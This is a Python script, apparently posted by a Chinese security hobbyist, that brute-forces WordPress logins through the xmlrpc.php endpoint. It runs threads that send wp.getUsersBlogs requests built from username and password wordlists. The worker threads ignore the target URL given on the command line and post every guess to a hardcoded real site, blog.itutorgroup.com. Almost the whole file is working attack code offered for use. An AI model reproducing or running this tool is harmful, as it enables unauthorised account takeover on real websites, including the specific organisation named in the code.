# -*- coding: UTF-8 -*-
'''
Desprition:
    此脚本用于多线程爆破wordpress的xmlrpc

Author:
    Sp4rkW   https://sp4rkw.blog.csdn.net/
    b站： 一只技术君

Modify:2019-09-14 13:47:16
'''


import requests,threading,re,time,sys,getopt


paraPWD = [] #全局变量密码字典数组



class exploit(threading.Thread):
    def __init__(self, username, s, errorData):
        threading.Thread.__init__(self)
        self.username = username
        self.s = s
        self.num = 0
        self.errorData = errorData
    def run(self):
        for password in paraPWD:
            postData = '''<?xml version="1.0" encoding="iso-8859-1"?><methodCall>  
            <methodName>wp.getUsersBlogs</methodName>
            <params>   
            <param><value>{}</value></param>   
            <param><value>{}</value></param>  
            </params>
            </methodCall>
            '''.format(self.username.decode('utf-8'),password.decode('utf-8'))
            result = len(s.post('http://blog.itutorgroup.com/xmlrpc.php',data=postData).text)
            if result == self.errorData:
                self.num = self.num + 1
            else:
                print('++++++ 成功爆出账号对应密码'+self.username.decode('utf-8')+'    '+password.decode('utf-8'))
        print('用户名'+self.username.decode('utf-8')+'此线程已经爆破完成，总共完成'+str(self.num+1)+'次爆破')

if __name__ == "__main__":
    parameter1 = ''
    parameter2 = ''
    parameter3 = ''
    try:
        opts, args = getopt.getopt(sys.argv[1:],"hu:",['pwd=','user='])
    except getopt.GetoptError:
        print('''
                                     _                                       
                                    | |                                      
__      ___ __ ________  ___ __ ___ | |_ __ _ __   ___ ______ _   _ ___  ___ 
\ \ /\ / / '_ \______\ \/ / '_ ` _ \| | '__| '_ \ / __|______| | | / __|/ _ \
 \ V  V /| |_) |      >  <| | | | | | | |  | |_) | (__       | |_| \__ \  __/
  \_/\_/ | .__/      /_/\_\_| |_| |_|_|_|  | .__/ \___|       \__,_|___/\___|
         | |                               | |                               
         |_|                               |_|                               
                      
Desprition:
    此脚本用于多线程爆破wordpress的xmlrpc

Author:
    Sp4rkW   https://sp4rkw.blog.csdn.net/
    b站： 一只技术君

help:  python poc.py -u xxxx/xmlrpc.php --user abspath/xxx.txt --pwd abspath/xxx.txt
    ''')
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            print('''
                                     _                                       
                                    | |                                      
__      ___ __ ________  ___ __ ___ | |_ __ _ __   ___ ______ _   _ ___  ___ 
\ \ /\ / / '_ \______\ \/ / '_ ` _ \| | '__| '_ \ / __|______| | | / __|/ _ \
 \ V  V /| |_) |      >  <| | | | | | | |  | |_) | (__       | |_| \__ \  __/
  \_/\_/ | .__/      /_/\_\_| |_| |_|_|_|  | .__/ \___|       \__,_|___/\___|
         | |                               | |                               
         |_|                               |_|                               
                        
Desprition:
    此脚本用于多线程爆破wordpress的xmlrpc

Author:
    Sp4rkW   https://sp4rkw.blog.csdn.net/
    b站： 一只技术君

help:  python poc.py -u xxxx/xmlrpc.php --user abspath/xxx.txt --pwd abspath/xxx.txt
    ''')
            sys.exit()
        elif opt in ("-u"):
            parameter1 = arg
        elif opt in ("--user"):
            parameter2 = arg
        elif opt in ("--pwd"):
            parameter3 = arg
    print('''
                                     _                                       
                                    | |                                      
__      ___ __ ________  ___ __ ___ | |_ __ _ __   ___ ______ _   _ ___  ___ 
\ \ /\ / / '_ \______\ \/ / '_ ` _ \| | '__| '_ \ / __|______| | | / __|/ _ \
 \ V  V /| |_) |      >  <| | | | | | | |  | |_) | (__       | |_| \__ \  __/
  \_/\_/ | .__/      /_/\_\_| |_| |_|_|_|  | .__/ \___|       \__,_|___/\___|
         | |                               | |                               
         |_|                               |_|                               


    ''')
    if parameter1 and parameter2 and parameter3:
        pass
    else:
        print('三个参数必须都输入')
        sys.exit()
    s = requests.session()
    postData = '''<?xml version="1.0" encoding="iso-8859-1"?><methodCall>  
    <methodName>wp.getUsersBlogs</methodName>
    <params>   
    <param><value>domain</value></param>   
    <param><value>domain</value></param>  
    </params>
    </methodCall>
    '''
    errorData = len(s.post(parameter1,data=postData).text)
    user = []
    with open(parameter2,'r') as f:
        lines = f.readlines()
        user = [name.replace('\n','').encode('utf-8') for name in lines]
    with open(parameter3,'r',encoding='utf-8') as f:
        lines = f.readlines()
        paraPWD = [pwd.replace('\n','').encode('utf-8') for pwd in lines]
    i = 0
    while(i < len(user)):
        while(threading.activeCount() < 7):
            exploit(user[i],s,errorData).start()
            i = i + 1
            if(i >= len(user)):
                break
        time.sleep(10)
        



    





